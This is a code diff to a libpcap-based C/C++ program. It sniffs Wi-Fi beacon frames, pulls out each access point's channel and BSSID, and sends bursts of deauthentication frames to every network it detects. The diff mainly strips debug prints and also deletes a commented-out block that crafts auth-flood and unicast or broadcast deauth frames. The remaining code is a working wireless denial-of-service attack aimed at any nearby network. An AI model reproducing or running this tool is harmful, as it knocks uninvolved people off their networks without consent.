@@ -72,31 +72,21 @@ int parsing(struct ParsData *pData,const u_char *buf,struct pcap_pkthdr * header
     return 0;
 }
 u_int8_t par_chan(const u_char *buf,struct ParsData pData){
-    //printf("len = %d\n",pData.rH_len);
-    //printf("total len = %d\n",pData.total_len);
-    //printf("frame len = %d\n",pData.frame_len);
     int tag_len = pData.frame_len - BEACONLEN - FIXLEN - 4;
     int tag_start = pData.rH_len + BEACONLEN + FIXLEN;
-    //printf("start = %d\n",tag_start);
-    //printf("tag len = %d\n",tag_len);
     u_int8_t temp;
     for(int i = 0; i < tag_len ;){
         memcpy(&temp,&buf[i+tag_start],1);    
-        //printf("para = %.2x \n",temp);
-        
         if(temp == 3)
         {
             u_int8_t ret;
             memcpy(&ret,&buf[i+tag_start+2],1);
-            //printf("channel = %d\n",ret);
             return ret;
         }
         u_int8_t para_size;
         memcpy(&para_size,&buf[tag_start + 1 + i],1);
-        //printf("para size = %.2x \n",para_size);
         i += para_size;// + para LEN
         i +=2;//para + len_len
-        //printf("i size = %d \n",i);
 
     }
 
@@ -247,7 +237,6 @@ int set_chan(int argc,char* argv[]){
         }
         while(1)
         {
-            printf("Hello set chan\n");
             sleep(1);
             args = argv + 3;
             int count = 0;
@@ -303,13 +292,10 @@ int main(int argc, char* argv[]) {
     t_argv[0] = (char*)malloc(sizeof(char)*4096);
     t_argv[1] = (char*)malloc(sizeof(char)*4096);
     t_argv[2] = (char*)malloc(sizeof(char)*4096);
-    //t_argv[3] = (char*)malloc(sizeof(char)*4096);
     strcpy(t_argv[0],"iwlist");
     strcpy(t_argv[1],argv[1]);
     strcpy(t_argv[2],"channel");
-    //sprintf(t_argv[3],"%d",chan);
     get_chan(3,t_argv);
-    //set_chan(4,t_argv);
     free(t_argv[0]);
     free(t_argv[1]);
     free(t_argv[2]);
@@ -328,7 +314,6 @@ int main(int argc, char* argv[]) {
     t->detach();
 
     while (true) {//rec packet
-        printf("hi\n");
 		struct pcap_pkthdr* header;
 		const u_char* packet;
 		int res = pcap_next_ex(pcap, &header, &packet);
@@ -340,66 +325,16 @@ int main(int argc, char* argv[]) {
         parsing(&pData,packet,header);
         int chan;
         if(pData.fc == BEACON){
-            printf("Hello Becon\n");
             if((chan= par_chan(packet,pData))==0){//fail get channel
                 continue;
             }
 
             memcpy(&bssid,&packet[pData.rH_len + 16],6);
-            printf("%.2x",bssid[0]);
-            printf("%.2x",bssid[1]);
-            printf("%.2x",bssid[2]);
-            printf("%.2x",bssid[3]);
-            printf("%.2x",bssid[4]);
-            printf("%.2x\n",bssid[5]);
-
             for(int i=0;i<10;i++){
                 send_deauth(bssid);
             }
         }
     }
-/*
-    while(1)
-    {
-        if(para.pbit[1] == 1){//if auth Attack
-            memcpy(frame_buf,AUTH_REQ,43);
-            memcpy(&frame_buf[13+4],&para.ap,6);
-            memcpy(&frame_buf[13+4+6],&para.sta,6);
-            memcpy(&frame_buf[13+4+6+6],&para.ap,6);
-            pcap_sendpacket(pcap,reinterpret_cast<const u_char*>(frame_buf),43);
-            for(int i=0; i < 26;i++){
-                printf("%.2x",(unsigned int)frame_buf[i]);
-            }
-            printf("\n");
-        }else{//if deauth Attack
-            if(para.pbit[0] == 1){// ucast
-                memcpy(frame_buf,DEAUTH_REQ,26+13);
-                if(bit == 0){//ap -> sta
-                    bit = 1; 
-                    memcpy(&frame_buf[13+4],&para.sta,6);
-                    memcpy(&frame_buf[13+4+6],&para.ap,6);
-                    memcpy(&frame_buf[13+4+6+6],&para.ap,6);
-                }else{//sta->ap
-                    bit = 0; 
-                    memcpy(&frame_buf[13+4],&para.ap,6);
-                    memcpy(&frame_buf[13+4+6],&para.sta,6);
-                    memcpy(&frame_buf[13+4+6+6],&para.ap,6);
-                }
-                for(int i=0; i < 26;i++){
-                    printf("%.2x",(unsigned int)frame_buf[i]);
-                }
-            	printf("\n");
-            }else{//bcast
-                memcpy(frame_buf,DEAUTH_REQ,26+13);
-                memcpy(&frame_buf[13+4+6],&para.ap,6);
-                memcpy(&frame_buf[13+4+6+6],&para.ap,6);
-            }
-            pcap_sendpacket(pcap,reinterpret_cast<const u_char*>(frame_buf),26+13);
-        }
-        //send packet
-        sleep(0.1);
-    }
-    */
     free(my_chan);
 	pcap_close(pcap);
 }
